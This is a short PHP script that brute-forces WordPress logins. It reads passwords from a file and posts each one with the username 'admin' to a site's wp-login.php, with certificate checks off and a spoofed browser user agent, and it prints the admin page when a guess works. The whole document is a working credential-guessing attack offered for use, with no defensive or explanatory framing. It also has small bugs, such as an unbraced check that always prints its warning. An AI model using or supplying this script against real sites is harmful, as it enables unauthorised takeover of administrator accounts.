<?php
function curl_hack_wp_login( $login_user, $login_pass, $login_url, $visit_url, $http_agent, $cookie_file ){

    if( !function_exists( 'curl_init' ) || ! function_exists( 'curl_exec' ))
        $m = "cUrl is not vailable in you PHP server.";
        echo $m;

    #Preparing postdata for wordpress login
    $data = "log=". $login_user ."&pwd=" . $login_pass . "&wp-submit=Log%20In&redirect_to=" . $visit_url;
    #Intialize cURL
    $ch = curl_init();
    #Url to use
    curl_setopt( $ch, CURLOPT_URL, $login_url );
    #Set the cookies for the login in a cookie file.
    curl_setopt( $ch, CURLOPT_COOKIEJAR, $cookie_file );
    #Set SSL to false
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
    #User agent
    curl_setopt( $ch, CURLOPT_USERAGENT, $http_agent );
    #Maximum time cURL will wait for get response. in seconds
    curl_setopt( $ch, CURLOPT_TIMEOUT, 60 );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
    #Return or echo the execution
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    #Set Http referer.
    curl_setopt( $ch, CURLOPT_REFERER, $login_url );
    #Post fields to the login url
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $data );
    curl_setopt( $ch, CURLOPT_POST, 1);
    #Save the return in a variable
    $content = curl_exec ($ch);
    #Close the cURL.
    $result = curl_getinfo ($ch);
    curl_close( $ch );
    if ( urlencode($result['url']) === $visit_url){
      #You can echo or return the page data here.
      echo $content;
    }
}

$login_user = "admin";
$password_file = file_get_contents('passwords.txt');
$login_pass = explode(",", $password_file);
$login_url = "http://sandbox.com/wp-login.php";
$visit_url = urlencode( 'http://sandbox.com/wp-admin/' );
$cookie_file = "/cookie.txt";
$http_agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6";

foreach ( $login_pass as $login ){
  curl_hack_wp_login( $login_user, $login, $login_url, $visit_url, $http_agent, $cookie_file );
}